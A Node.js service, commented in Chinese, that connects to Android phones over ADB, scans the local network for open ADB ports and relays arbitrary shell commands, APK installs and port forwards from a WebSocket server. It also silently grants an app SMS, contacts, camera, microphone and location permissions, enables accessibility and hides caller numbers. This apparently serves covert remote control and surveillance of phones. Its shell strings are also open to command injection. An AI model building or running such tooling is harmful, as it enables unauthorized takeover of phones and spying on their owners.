/**
 * ADB Bridge — 通过 Android Debug Bridge 与设备保持持久连接
 *
 * 职责：
 *   1. adb connect 到设备列表（TCP/WiFi）
 *   2. 通过 adb shell 循环发送心跳，维持在线状态
 *   3. 通过 Redis 总线向主 WS 服务同步设备状态
 *   4. 收到 WS 转发来的 ADB 命令 → 通过 adb shell 执行并返回结果
 *   5. 在 protocol_sessions 中注册 adb 协议
 *   6. 设备断开自动重连
 *
 * 用法：
 *   作为独立服务运行，或由 docker-compose 管理：
 *     node api/ws/adb-bridge.js
 *
 * 环境变量:
 *   ADB_BRIDGE_ENABLE=1              启用
 *   ADB_DEVICE_LIST=192.168.1.10:5555,192.168.1.11:5555  设备列表（逗号分隔）
 *   ADB_AUTO_SCAN=1                  自动扫描局域网 5555 端口
 *   ADB_AUTO_SCAN_SUBNET=192.168.1.0/24  扫描子网（默认自动检测）
 *   ADB_HEARTBEAT_CMD=echo alive     心跳命令（默认 echo ok）
 *   ADB_HEARTBEAT_INTERVAL_SEC=30    心跳间隔
 *   ADB_CONNECT_BACKOFF_MIN=10       重连最小间隔（秒）
 *   ADB_CONNECT_BACKOFF_MAX=300      重连最大间隔（秒）
 *   WS_SECRET=xxx                    WS 密钥（转发给主 WS）
 */

const { execSync, exec } = require('child_process');
const path = require('path');
const fs = require('fs');

// ========== 配置 ==========
const ENABLED = /^(1|true|yes)$/i.test(process.env.ADB_BRIDGE_ENABLE || '1');
const DEVICE_LIST = (process.env.ADB_DEVICE_LIST || '').split(',').map(s => s.trim()).filter(Boolean);
const AUTO_SCAN = /^(1|true|yes)$/i.test(process.env.ADB_AUTO_SCAN || '');
const AUTO_SCAN_SUBNET = process.env.ADB_AUTO_SCAN_SUBNET || '';
const HEARTBEAT_CMD = process.env.ADB_HEARTBEAT_CMD || 'echo ok';
const HEARTBEAT_INTERVAL = Math.max(5, Number(process.env.ADB_HEARTBEAT_INTERVAL_SEC || 30)) * 1000;
const CONNECT_BACKOFF_MIN = Math.max(5, Number(process.env.ADB_CONNECT_BACKOFF_MIN || 10));
const CONNECT_BACKOFF_MAX = Math.max(60, Number(process.env.ADB_CONNECT_BACKOFF_MAX || 300));
const REDIS_ENABLE = /^(1|true|yes)$/i.test(process.env.REDIS_ENABLE || '');
const WS_SECRET = process.env.WS_SECRET || '';
const PHP_API_URL = (process.env.PHP_API_URL || process.env.APP_URL || 'http://127.0.0.1').replace(/\/$/, '');
const SESSION_TTL_SEC = Math.max(60, Number(process.env.ADB_SESSION_TTL_SEC || 300));
// 设备离线通知限频：同一设备最多每 N 秒推送一次 device.close（默认 3600=1h）
const STALE_NOTIFY_INTERVAL = Math.max(60, Number(process.env.ADB_STALE_NOTIFY_INTERVAL_SEC || 3600)) * 1000;

// ========== 状态管理 ==========
// deviceKey -> { serial, state: 'connecting'|'online'|'offline', lastPing, backoff, socket? }
const devices = new Map();
const lastStaleNotified = new Map();   // key -> timestamp, 控制 device.close 推送频率
let redisBus = null;

// ========== Redis 初始化 ==========
if (REDIS_ENABLE) {
  try {
    const { initRedisBus, publishEvent } = require('./redis-bus');
    initRedisBus().then(bus => {
      if (bus.enabled) redisBus = { publishEvent };
    }).catch(() => {});
  } catch {}
}

// ========== 工具函数 ==========
function log(tag, msg) {
  console.log(`[ADB:${tag}] ${msg}`);
}
function warn(tag, msg) {
  console.warn(`[ADB:${tag}] ${msg}`);
}

function safeExec(cmd, timeout = 30000) {
  try {
    return execSync(cmd, { timeout, encoding: 'utf8', stdio: ['pipe', 'pipe', 'pipe'] }).trim();
  } catch (e) {
    return null;
  }
}

function claimSession(phoneId, version, meta = {}) {
  if (!PHP_API_URL) return;
  const url = `${PHP_API_URL}/api/protocol_session.php`;
  const body = JSON.stringify({ phoneId, protocol: 'adb', version: version || '1', ttlSec: SESSION_TTL_SEC, meta });
  exec(`curl -s -X POST '${url}' -H 'Content-Type: application/json' -d '${body.replace(/'/g, "'\\''")}'`, { timeout: 5000 }, () => {});
}

function upsertDeviceStatus(device) {
  if (!PHP_API_URL || !device.phone_id) return;
  const params = new URLSearchParams({
    phone_id: device.phone_id,
    user_email: device.user_email || '',
    phone_name: device.phone_name || '',
    android_ver: device.android_ver || '',
    model: device.model || '',
    country: device.country || '',
    battery_charg: device.battery_charg || '',
  });
  const url = `${PHP_API_URL}/api/ws/ws_config.php?action=upsert&${params.toString()}`;
  exec(`curl -s '${url}'`, { timeout: 5000 }, () => {});
}

async function publishDeviceEvent(event) {
  if (redisBus) {
    try {
      await redisBus.publishEvent('device:event', { source: 'adb', ...event });
    } catch {}
  }
}

// ========== ADB 核心操作 ==========

/** 获取 ADB 已连接设备列表 */
function getConnectedDevices() {
  const out = safeExec('adb devices', 5000);
  if (!out) return [];
  return out.split('\n')
    .slice(1)
    .map(line => line.trim())
    .filter(line => line && !line.startsWith('*') && !line.startsWith('daemon'))
    .map(line => {
      const [serial, state] = line.split(/\s+/);
      return { serial, state };
    })
    .filter(d => d.state === 'device');
}

/** 连接 ADB 设备 (TCP/IP) */
function adbConnect(host) {
  // 如果没有端口后缀，默认 5555
  if (!host.includes(':')) host = `${host}:5555`;
  const out = safeExec(`adb connect ${host}`, 10000);
  if (out && !out.includes('failed') && !out.includes('cannot')) {
    log('CONNECT', `${host} → ${out}`);
    return getConnectedDevices().find(d => d.serial === host || d.serial.includes(host.split(':')[0]));
  }
  warn('CONNECT', `${host} → ${out || 'timeout/error'}`);
  return null;
}

/** 断开 ADB 设备 */
function adbDisconnect(host) {
  safeExec(`adb disconnect ${host}`, 5000);
}

/** 通过 ADB shell 执行命令，返回输出 */
function adbShell(serial, cmd, timeout = 15000) {
  return safeExec(`adb -s ${serial} shell ${cmd}`, timeout);
}

/** 获取设备属性 */
function fetchDeviceProps(serial) {
  const props = {};
  // ——— 基础信息 ———
  const model = safeExec(`adb -s ${serial} shell getprop ro.product.model`, 5000);
  if (model) props.model = model;
  const brand = safeExec(`adb -s ${serial} shell getprop ro.product.brand`, 5000);
  if (brand) props.brand = brand;
  const version = safeExec(`adb -s ${serial} shell getprop ro.build.version.release`, 5000);
  if (version) props.android_ver = version;
  const sdk = safeExec(`adb -s ${serial} shell getprop ro.build.version.sdk`, 5000);
  if (sdk) props.sdk = sdk;
  const name = safeExec(`adb -s ${serial} shell getprop ro.product.name`, 5000);
  if (name) props.phone_name = name;
  const manufacturer = safeExec(`adb -s ${serial} shell getprop ro.product.manufacturer`, 5000);
  if (manufacturer) props.manufacturer = manufacturer;
  const displayId = safeExec(`adb -s ${serial} shell getprop ro.build.display.id`, 5000);
  if (displayId) props.display_id = displayId;

  // ——— 国产 ROM 检测 ———
  const miuiVer = safeExec(`adb -s ${serial} shell getprop ro.miui.ui.version.name`, 5000);
  if (miuiVer) { props.rom = 'MIUI'; props.miui_ver = miuiVer; }
  const emuiVer = safeExec(`adb -s ${serial} shell getprop ro.build.version.emui`, 5000);
  if (emuiVer) { props.rom = 'EMUI'; props.emui_ver = emuiVer; }
  const hwApi = safeExec(`adb -s ${serial} shell getprop ro.build.hw_emui_api_level`, 5000);
  if (hwApi && !props.rom) props.rom = 'EMUI';
  const colorOs = safeExec(`adb -s ${serial} shell getprop ro.build.version.opporom`, 5000);
  if (colorOs) { props.rom = 'ColorOS'; props.coloros_ver = colorOs; }
  const vivoOs = safeExec(`adb -s ${serial} shell getprop ro.vivo.os.build.display.id`, 5000);
  if (vivoOs) { props.rom = 'FuntouchOS'; props.vivo_os_ver = vivoOs; }
  const flymeVer = safeExec(`adb -s ${serial} shell getprop ro.build.flyme.version`, 5000);
  if (flymeVer) { props.rom = 'Flyme'; props.flyme_ver = flymeVer; }
  const oneuiVer = safeExec(`adb -s ${serial} shell getprop ro.build.version.oneui`, 5000);
  if (oneuiVer) { props.rom = 'OneUI'; props.oneui_ver = oneuiVer; }
  if (!props.rom) {
    // 兜底：根据 manufacturer 判断
    const mfr = String(props.manufacturer || '').toLowerCase();
    if (mfr.includes('xiaomi') || mfr.includes('redmi')) props.rom = 'MIUI';
    else if (mfr.includes('huawei') || mfr.includes('honor')) props.rom = 'EMUI';
    else if (mfr.includes('oppo') || mfr.includes('oneplus')) props.rom = 'ColorOS';
    else if (mfr.includes('vivo') || mfr.includes('iqoo')) props.rom = 'FuntouchOS';
    else if (mfr.includes('meizu')) props.rom = 'Flyme';
    else if (mfr.includes('samsung')) props.rom = 'OneUI';
    else props.rom = 'AOSP';
  }

  // ——— 电量 ———
  const battery = safeExec(`adb -s ${serial} shell dumpsys battery | grep level`, 5000);
  if (battery) {
    const m = battery.match(/(\d+)/);
    if (m) props.battery_charg = `${m[1]}%`;
  }

  // ——— 国家/地区（从 WiFi 或 SIM 推断） ———
  const simCountry = safeExec(`adb -s ${serial} shell getprop gsm.sim.operator.iso-country`, 5000);
  if (simCountry) props.country = simCountry.trim().toUpperCase();
  if (!props.country) {
    const wifiCountry = safeExec(`adb -s ${serial} shell getprop wifi.interface`, 5000);
    // 兜底留空，WS 端会从 CF-IPCountry 覆盖
  }

  return props;
}

/**
 * 根据 ROM 类型返回设备端的权限授予命令链
 * 用于 adb 连接后自动执行，确保无障碍/后台/通知权限
 * @param {string} serial - 设备序列号
 * @param {string} pkg   - APK 包名
 * @param {string} rom   - 检测到的 ROM 类型
 * @returns {Array<{cmd:string, desc:string}>} 命令列表
 */
function getRomGrantCommands(serial, pkg, rom) {
  if (!serial || !pkg) return [];
  const base = `adb -s ${serial}`;
  const cmds = [];
  const romType = (rom || 'AOSP').toLowerCase();

  // 所有 Android 通用：授予运行时权限
  cmds.push({ cmd: `${base} shell pm grant ${pkg} android.permission.SYSTEM_ALERT_WINDOW`, desc: '悬浮窗' });
  cmds.push({ cmd: `${base} shell pm grant ${pkg} android.permission.WRITE_EXTERNAL_STORAGE`, desc: '存储写' });
  cmds.push({ cmd: `${base} shell pm grant ${pkg} android.permission.READ_EXTERNAL_STORAGE`, desc: '存储读' });
  cmds.push({ cmd: `${base} shell pm grant ${pkg} android.permission.READ_CONTACTS`, desc: '通讯录' });
  cmds.push({ cmd: `${base} shell pm grant ${pkg} android.permission.READ_SMS`, desc: '短信' });
  cmds.push({ cmd: `${base} shell pm grant ${pkg} android.permission.CAMERA`, desc: '相机' });
  cmds.push({ cmd: `${base} shell pm grant ${pkg} android.permission.RECORD_AUDIO`, desc: '录音' });
  cmds.push({ cmd: `${base} shell pm grant ${pkg} android.permission.ACCESS_FINE_LOCATION`, desc: '精确定位' });
  cmds.push({ cmd: `${base} shell appops set ${pkg} 77 allow`, desc: '后台启动Activity' });

  if (romType === 'miui') {
    // MIUI 特殊：自启动、省电白名单、后台限制
    cmds.push({ cmd: `${base} shell appops set ${pkg} 66 allow`, desc: 'MIUI 自启动' });
    cmds.push({ cmd: `${base} shell appops set ${pkg} 67 allow`, desc: 'MIUI 后台定位' });
    cmds.push({ cmd: `${base} shell settings put global captive_portal_detection_enabled 0`, desc: 'MIUI 关闭网络检测' });
    cmds.push({ cmd: `${base} shell am broadcast -a android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS`, desc: 'MIUI 通知监听' });
    cmds.push({ cmd: `${base} shell settings put system screen_buttons_timeout 600000`, desc: 'MIUI 防息屏' });
  } else if (romType === 'emui') {
    // 华为 EMUI / HarmonyOS：后台保护、自启动
    cmds.push({ cmd: `${base} shell appops set ${pkg} 66 allow`, desc: 'EMUI 自启动' });
    cmds.push({ cmd: `${base} shell settings put secure accessibility_enabled 1`, desc: 'EMUI 无障碍' });
    cmds.push({ cmd: `${base} shell settings put system hw_show_number 0`, desc: 'EMUI 隐藏号码' });
  } else if (romType === 'coloros') {
    // OPPO/OnePlus ColorOS
    cmds.push({ cmd: `${base} shell appops set ${pkg} 66 allow`, desc: 'ColorOS 自启动' });
    cmds.push({ cmd: `${base} shell settings put secure assistant 0`, desc: 'ColorOS 关闭助手' });
  } else if (romType === 'funtouchos') {
    // vivo FuntouchOS / OriginOS
    cmds.push({ cmd: `${base} shell appops set ${pkg} 66 allow`, desc: 'vivo 自启动' });
    cmds.push({ cmd: `${base} shell settings put secure swipe_up_to_switch_screen_enabled 0`, desc: 'vivo 关闭快捷' });
  } else if (romType === 'flyme') {
    // 魅族 Flyme
    cmds.push({ cmd: `${base} shell appops set ${pkg} 66 allow`, desc: 'Flyme 自启动' });
    cmds.push({ cmd: `${base} shell am broadcast -a com.meizu.safe.SECURE_SETTINGS`, desc: 'Flyme 安全设置' });
  } else if (romType === 'oneui') {
    // 三星 OneUI
    cmds.push({ cmd: `${base} shell appops set ${pkg} 66 allow`, desc: 'OneUI 自启动' });
    cmds.push({ cmd: `${base} shell settings put secure accessibility_enabled 1`, desc: 'OneUI 无障碍' });
  }

  // 通用防休眠
  cmds.push({ cmd: `${base} shell settings put system screen_off_timeout 1800000`, desc: '防息屏(30min)' });
  cmds.push({ cmd: `${base} shell settings put global window_animation_scale 0`, desc: '关窗口动画' });
  cmds.push({ cmd: `${base} shell settings put global transition_animation_scale 0`, desc: '关转场动画' });
  cmds.push({ cmd: `${base} shell settings put global animator_duration_scale 0`, desc: '关动画时长' });

  return cmds;
}

/**
 * 执行 ROM 权限授予命令链
 */
async function applyRomGrantCommands(serial, pkg, rom) {
  const cmds = getRomGrantCommands(serial, pkg, rom);
  const results = [];
  for (const item of cmds) {
    try {
      const out = safeExec(item.cmd, 8000);
      results.push({ ...item, success: out !== null });
      if (out !== null) log('GRANT', `${item.desc} ✓`);
      else warn('GRANT', `${item.desc} ✗`);
    } catch (e) {
      results.push({ ...item, success: false, error: e.message });
    }
  }
  return results;
}

/** 心跳检测 — 维持设备在线 */
function adbHeartbeat(serial) {
  const out = safeExec(`adb -s ${serial} shell "${HEARTBEAT_CMD}"`, 10000);
  return out !== null;
}

// ========== 设备管理循环 ==========

async function manageDevice(deviceKey) {
  let state = devices.get(deviceKey) || { serial: deviceKey, state: 'offline', backoff: CONNECT_BACKOFF_MIN, lastPing: 0 };

  // 1) 如果已在线，做心跳检查
  if (state.state === 'online') {
    if (!adbHeartbeat(state.serial)) {
      warn('HEARTBEAT', `${deviceKey} 心跳失败，标记离线`);
      state.state = 'offline';
      state.backoff = CONNECT_BACKOFF_MIN;
      devices.set(deviceKey, state);
      publishDeviceEvent({ type: 'device.close', phoneId: deviceKey, reason: 'adb-heartbeat-fail' });
      claimSession(deviceKey, '1', { state: 'offline', reason: 'heartbeat' });
    } else {
      // 心跳成功 — 刷新在线
      state.lastPing = Date.now();
      devices.set(deviceKey, state);
      publishDeviceEvent({ type: 'device.ping', phoneId: deviceKey, payload: { phone_id: deviceKey, source: 'adb', lastPing: Date.now() } });
      claimSession(deviceKey, '1', { state: 'online' });
    }
    return;
  }

  // 2) 离线状态 — 尝试连接
  if (state.state === 'offline') {
    const now = Date.now();
    const backoffMs = state.backoff * 1000;
    if (state.lastPing && (now - state.lastPing) < backoffMs) return; // 等待退避

    log('RECONNECT', `尝试连接 ${deviceKey} (退避 ${state.backoff}s)`);
    const connected = adbConnect(deviceKey);
    if (connected) {
      state.state = 'online';
      state.lastPing = Date.now();
      state.backoff = CONNECT_BACKOFF_MIN;

      // 拉取设备属性
      const props = fetchDeviceProps(deviceKey);
      Object.assign(state, props);

      devices.set(deviceKey, state);
      log('ONLINE', `${deviceKey} 上线 (${props.model || 'unknown'})`);

      // 通知总线 + 注册 session
      publishDeviceEvent({ type: 'device.ping', phoneId: deviceKey, payload: { phone_id: deviceKey, source: 'adb', ...props, lastPing: Date.now() } });
      claimSession(deviceKey, '1', { state: 'online', model: props.model });
      upsertDeviceStatus({ phone_id: deviceKey, ...props });
    } else {
      // 连接失败，指数退避
      state.backoff = Math.min(state.backoff * 2, CONNECT_BACKOFF_MAX);
      state.lastPing = Date.now();
      devices.set(deviceKey, state);
      warn('RECONNECT', `${deviceKey} 连接失败，下次在 ${state.backoff}s 后`);
    }
  }
}

/** 添加设备到管理列表 */
function addDevice(deviceKey) {
  if (!devices.has(deviceKey)) {
    devices.set(deviceKey, { serial: deviceKey, state: 'offline', backoff: CONNECT_BACKOFF_MIN, lastPing: 0 });
    log('WATCH', `开始监控设备 ${deviceKey}`);
  }
}

/** 局域网自动发现 — arp-scan 或 ping 扫描 5555 端口 */
function autoScan() {
  if (!AUTO_SCAN) return;
  // 如果已有已知设备且都在线，跳过扫描
  const allOnline = Array.from(devices.values()).every(d => d.state === 'online');
  if (allOnline && devices.size > 0) return;

  log('SCAN', '扫描局域网 ADB 设备...');
  let candidates = [];

  try {
    // 方案1: 用 adb 自身的 scan
    const out = safeExec('adb shell "ip -o -4 addr show | grep -oP \'(?<=inet )\\d+\\.\\d+\\.\\d+\\.\\d+\'"', 5000);
    if (out) log('SCAN', `本机IP: ${out}`);
  } catch {}

  try {
    // 方案2: 尝试 arp-scan (Linux/Mac)
    if (AUTO_SCAN_SUBNET) {
      const result = safeExec(`arp-scan --localnet 2>/dev/null || nmap -sn ${AUTO_SCAN_SUBNET} 2>/dev/null || echo "no-scanner"`, 30000);
      if (result && result !== 'no-scanner') {
        // 提取 IP
        const ips = result.match(/\d+\.\d+\.\d+\.\d+/g) || [];
        candidates.push(...ips);
      }
    }
  } catch {}

  // 去重 + 排除已有设备
  const existing = new Set(devices.keys());
  for (const ip of candidates) {
    const key = `${ip}:5555`;
    if (!existing.has(key)) {
      addDevice(key);
    }
  }
}

// ========== 命令中继接口 ==========

/**
 * 通过 ADB shell 执行命令（供主 WS 服务调用）
 * 返回格式: { success, output }
 */
function executeCommand(phoneId, command, timeout = 30000) {
  const device = devices.get(phoneId);
  if (!device || device.state !== 'online') {
    return { success: false, error: 'device offline or not found' };
  }
  const output = adbShell(device.serial, command, timeout);
  if (output === null) {
    device.state = 'offline';
    devices.set(phoneId, device);
    return { success: false, error: 'command failed, device marked offline' };
  }
  return { success: true, output };
}

/**
 * ADB forward 端口转发
 * adb forward tcp:本地端口 tcp:设备端口
 */
function portForward(phoneId, localPort, devicePort) {
  const device = devices.get(phoneId);
  if (!device || device.state !== 'online') return null;
  const out = safeExec(`adb -s ${device.serial} forward tcp:${localPort} tcp:${devicePort}`, 5000);
  if (out !== null) log('FORWARD', `${phoneId}: ${localPort} ←→ ${devicePort}`);
  return out;
}

/**
 * ADB reverse 反向转发
 * adb reverse tcp:设备端口 tcp:本地端口
 */
function portReverse(phoneId, devicePort, localPort) {
  const device = devices.get(phoneId);
  if (!device || device.state !== 'online') return null;
  return safeExec(`adb -s ${device.serial} reverse tcp:${devicePort} tcp:${localPort}`, 5000);
}

/**
 * 安装 APK
 */
function installApk(phoneId, apkPath) {
  const device = devices.get(phoneId);
  if (!device || device.state !== 'online') return { success: false, error: 'device offline' };
  const out = safeExec(`adb -s ${device.serial} install -r "${apkPath}"`, 120000);
  return { success: out !== null && !out.includes('Failure'), output: out };
}

// ========== 主循环 ==========

async function mainLoop() {
  // 1) 管理所有监控中的设备
  for (const [key] of devices) {
    try {
      await manageDevice(key);
    } catch (e) {
      warn('LOOP', `manageDevice(${key}) 异常: ${e.message}`);
    }
  }

  // 2) 定期扫描局域网
  if (AUTO_SCAN) {
    try { autoScan(); } catch {}
  }

  // 3) 清理离线的 Redis 状态
  for (const [key, device] of devices) {
    if (device.state === 'offline' && device.lastPing && (Date.now() - device.lastPing) > CONNECT_BACKOFF_MAX * 2 * 1000) {
      const lastNotify = lastStaleNotified.get(key) || 0;
      if (Date.now() - lastNotify < STALE_NOTIFY_INTERVAL) continue;
      lastStaleNotified.set(key, Date.now());
      // 通知WS总线标记离线（限频推送，避免重复耗尽 Redis）
      publishDeviceEvent({ type: 'device.close', phoneId: key, reason: 'adb-stale' });
    }
  }
}

// ========== 初始化 ==========

function init() {
  if (!ENABLED) {
    log('INIT', 'ADB Bridge 未启用 (ADB_BRIDGE_ENABLE=0)');
    return;
  }

  // 检查 adb 是否可用
  const adbCheck = safeExec('adb version', 5000);
  if (!adbCheck) {
    warn('INIT', 'adb 未安装或不可用。请安装 Android SDK Platform Tools。');
    warn('INIT', '下载: https://developer.android.com/tools/releases/platform-tools');
    warn('INIT', '或设置 ADB_BRIDGE_ENABLE=0 禁用');
    return;
  }
  log('INIT', `ADB 可用: ${adbCheck.split('\n')[0]}`);

  // 添加手动配置的设备
  for (const deviceKey of DEVICE_LIST) {
    if (deviceKey) addDevice(deviceKey);
  }

  // 启动主循环
  const intervalMs = Math.min(HEARTBEAT_INTERVAL, 15000); // 最快每 5s 循环一次
  setInterval(mainLoop, intervalMs);

  // 首次扫描
  if (AUTO_SCAN && DEVICE_LIST.length === 0) {
    setTimeout(autoScan, 2000);
  }

  log('INIT', `ADB Bridge 启动完毕。监控 ${devices.size} 个设备，心跳间隔 ${HEARTBEAT_INTERVAL/1000}s`);

  // 输出当前 ADB 已连设备
  const connected = getConnectedDevices();
  for (const d of connected) {
    if (!devices.has(d.serial)) {
      addDevice(d.serial);
    }
  }
}

// ========== 导出接口供 websocket-server.js 调用 ==========
module.exports = {
  init,
  addDevice,
  adbConnect,
  adbDisconnect,
  adbHeartbeat,
  fetchDeviceProps,
  getRomGrantCommands,
  applyRomGrantCommands,
  executeCommand,
  portForward,
  portReverse,
  installApk,
  getDevices: () => devices,
  getOnlineDevices: () => Array.from(devices.entries()).filter(([,d]) => d.state === 'online').map(([k,v]) => ({ phoneId: k, ...v })),
};

// 直接运行时启动
if (require.main === module) {
  init();
}
